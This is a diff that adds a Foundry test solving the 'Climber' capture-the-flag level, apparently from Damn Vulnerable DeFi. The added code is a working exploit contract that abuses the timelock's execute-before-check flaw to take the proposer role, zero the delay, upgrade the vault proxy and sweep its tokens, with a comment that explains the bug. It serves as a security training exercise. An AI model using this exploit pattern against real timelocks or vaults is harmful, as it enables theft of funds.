@@ -8,6 +8,53 @@ import "forge-std/Test.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
 import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";
+import {ClimberVaultV2} from "../../../src/Contracts/climber/ClimberVault.sol";
+
+contract AttackTimelock {
+
+    address public attacker;
+    address public proxy;
+
+    ClimberTimelock timelock;
+    ClimberVault  vault;
+    ClimberVaultV2 vaultV2;
+
+    constructor(address _attacker, address _proxy, address _timelock, address _vault, address _vaultV2) {
+        attacker = _attacker;
+        proxy = _proxy;
+        timelock = ClimberTimelock(payable(_timelock));
+        vault = ClimberVault(_vault);
+        vaultV2 = ClimberVaultV2(_vaultV2);
+    }
+
+    function exploit() external {
+        (address[] memory targets, uint256[] memory values, bytes[] memory data ) = getData();
+        timelock.schedule(targets, values, data, "SALT");
+    }
+
+    function getData() public view returns(address[] memory targets, uint256[] memory values, bytes[] memory data) {
+        targets = new address[](5);
+        targets[0] = address(timelock);
+        targets[1] = address(timelock);
+        targets[2] = proxy;
+        targets[3] = proxy;
+        targets[4] = address(this);
+        values = new uint256[](5);
+        values[0] = 0;
+        values[1] = 0;
+        values[2] = 0;
+        values[3] = 0;
+        values[4] = 0;
+        data = new bytes[](5);
+        data[0] = abi.encodeWithSignature("grantRole(bytes32,address)",keccak256("PROPOSER_ROLE"), address(this));
+        data[1] = abi.encodeWithSignature("updateDelay(uint64)", 0);
+        data[2] = abi.encodeWithSignature("upgradeTo(address)", address(vaultV2));
+        data[3] = abi.encodeWithSignature("setSweeper(address)", address(attacker));
+        data[4] = abi.encodeWithSignature("exploit()");
+    }
+
+}
+
 
 contract Climber is Test {
     uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;
@@ -88,6 +135,25 @@ contract Climber is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+
+        // Note: The key bug is in ClimberTimelock where the check to see if a operation is scheduled
+        // happens at the end of the function therefore you can make calls in execute to make the calls
+        // prior to the check and to make the final check pass just schedule all the calls you made in execute
+
+        AttackTimelock exploitAddress = new AttackTimelock(
+                                                            attacker,
+                                                            address(climberVaultProxy),
+                                                            address(climberTimelock),
+                                                            address(climberImplementation),
+                                                            address(new ClimberVaultV2())
+                                            );
+
+        (address[] memory targets, uint256[] memory values, bytes[] memory data ) = exploitAddress.getData();
+
+        climberTimelock.execute(targets, values, data, "SALT");
+
+        vm.prank(attacker);
+        ClimberVaultV2(address(climberVaultProxy)).sweepFunds(address(dvt));
 
         /** EXPLOIT END **/
         validation();
